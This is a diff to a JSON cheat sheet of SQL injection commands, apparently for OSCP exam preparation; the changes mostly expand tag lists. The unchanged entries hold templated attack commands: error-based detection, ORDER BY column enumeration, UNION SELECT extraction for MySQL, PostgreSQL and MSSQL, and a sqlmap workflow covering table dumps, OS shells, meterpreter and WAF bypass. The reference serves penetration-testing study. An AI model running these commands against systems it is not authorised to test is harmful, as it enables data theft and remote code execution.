@@ -9,7 +9,23 @@
       "subcategory": "sql-injection",
       "command": "curl -s '<URL>' | grep -iE 'error|warning|mysql|syntax|postgresql|mssql|oracle|sqlite'",
       "description": "Detect SQL injection vulnerabilities by triggering database errors with single quote payload",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "DETECTION", "QUICK_WIN"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "DETECTION",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "INJECTION",
+        "MSSQL",
+        "MYSQL",
+        "ORACLE",
+        "OSCP:HIGH",
+        "POSTGRESQL",
+        "QUICK_WIN",
+        "SQLI",
+        "SQL_INJECTION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -66,7 +82,19 @@
       "subcategory": "sql-injection",
       "command": "for i in {1..<MAX_COLS>}; do echo \"Testing column $i\"; curl -s '<URL> ORDER BY $i-- -' | grep -i error && echo \"Failed at column $i\" && break; done",
       "description": "Enumerate number of columns in SQL query using ORDER BY technique (required before UNION SELECT)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "ENUMERATION", "UNION"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "DISCOVERY",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -129,7 +157,18 @@
       "subcategory": "sql-injection",
       "command": "curl -s '<URL> UNION SELECT <NULL_COLUMNS>-- -'",
       "description": "Test UNION SELECT injection and identify which columns are displayed on page (required for data extraction)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "UNION", "EXTRACTION"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -192,7 +231,20 @@
       "subcategory": "sql-injection",
       "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
       "description": "Extract MySQL database information using UNION SELECT injection (database names, table names, column names, data)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "MYSQL", "EXTRACTION", "UNION"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "MYSQL",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -269,7 +321,20 @@
       "subcategory": "sql-injection",
       "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
       "description": "Extract PostgreSQL database information using UNION SELECT injection (databases, tables, columns, data, file read)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "POSTGRESQL", "EXTRACTION", "UNION"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "POSTGRESQL",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -345,7 +410,23 @@
       "subcategory": "sql-injection",
       "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
       "description": "Extract Microsoft SQL Server information using UNION SELECT injection (databases, tables, columns, xp_cmdshell RCE)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "MSSQL", "EXTRACTION", "UNION", "RCE"],
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "IIS",
+        "INJECTION",
+        "MSSQL",
+        "OSCP:HIGH",
+        "RCE",
+        "REMOTE_CODE_EXECUTION",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -424,7 +505,18 @@
       "subcategory": "sql-injection",
       "command": "sqlmap -u '<URL>' --batch --dump <OPTIONS>",
       "description": "Automated SQL injection exploitation using sqlmap (after manual verification - OSCP requires manual attempt first)",
-      "tags": ["OSCP:HIGH", "WEB", "SQLI", "AUTOMATION", "SQLMAP"],
+      "tags": [
+        "AUTOMATION",
+        "CREDENTIAL_ACCESS",
+        "DATABASE",
+        "EXPLOITATION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQLMAP",
+        "SQL_INJECTION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -491,7 +583,7 @@
         "slow_enumeration": "Increase threads: --threads=5. Skip constant columns: --no-cast. Use WHERE: --where='username like \"%admin%\"'",
         "no_os_shell": "Try --os-pwn for meterpreter. Check database user: --current-user. Escalate: --sql-shell then 'SELECT IS_SRVROLEMEMBER('sysadmin')' for MSSQL"
       },
-      "notes": "OSCP WORKFLOW REQUIREMENT: (1) ALWAYS attempt manual SQLi first (sqli-detection-error → sqli-column-enum-orderby → sqli-union-select-basic). (2) Document manual findings in investigation_checklist.md. (3) THEN use sqlmap for faster enumeration. Common sqlmap workflow: Step 1: Detect injection: sqlmap -u 'URL' --batch. Step 2: Enumerate databases: sqlmap -u 'URL' --batch --dbs. Step 3: Enumerate tables: sqlmap -u 'URL' --batch -D webapp_db --tables. Step 4: Dump specific table: sqlmap -u 'URL' --batch -D webapp_db -T users --dump. Step 5: Attempt OS shell: sqlmap -u 'URL' --batch --os-shell (MSSQL xp_cmdshell, PostgreSQL COPY). Output location: ~/.local/share/sqlmap/output/<TARGET>/ (check log.txt for full output). Time estimate: 5-30 minutes depending on injection type and database size. WAF bypass: Use --tamper=space2comment for comments, --tamper=between for AND/OR replacement. POST requests: sqlmap -u 'URL' --data='id=1&submit=Submit' (specify POST data). Cookies: --cookie='PHPSESSID=abc123'. Custom headers: --headers='X-Forwarded-For: 127.0.0.1'. REMEMBER: Manual technique demonstrates understanding for OSCP report.",
+      "notes": "OSCP WORKFLOW REQUIREMENT: (1) ALWAYS attempt manual SQLi first (sqli-detection-error \u2192 sqli-column-enum-orderby \u2192 sqli-union-select-basic). (2) Document manual findings in investigation_checklist.md. (3) THEN use sqlmap for faster enumeration. Common sqlmap workflow: Step 1: Detect injection: sqlmap -u 'URL' --batch. Step 2: Enumerate databases: sqlmap -u 'URL' --batch --dbs. Step 3: Enumerate tables: sqlmap -u 'URL' --batch -D webapp_db --tables. Step 4: Dump specific table: sqlmap -u 'URL' --batch -D webapp_db -T users --dump. Step 5: Attempt OS shell: sqlmap -u 'URL' --batch --os-shell (MSSQL xp_cmdshell, PostgreSQL COPY). Output location: ~/.local/share/sqlmap/output/<TARGET>/ (check log.txt for full output). Time estimate: 5-30 minutes depending on injection type and database size. WAF bypass: Use --tamper=space2comment for comments, --tamper=between for AND/OR replacement. POST requests: sqlmap -u 'URL' --data='id=1&submit=Submit' (specify POST data). Cookies: --cookie='PHPSESSID=abc123'. Custom headers: --headers='X-Forwarded-For: 127.0.0.1'. REMEMBER: Manual technique demonstrates understanding for OSCP report.",
       "oscp_relevance": "high"
     }
   ]
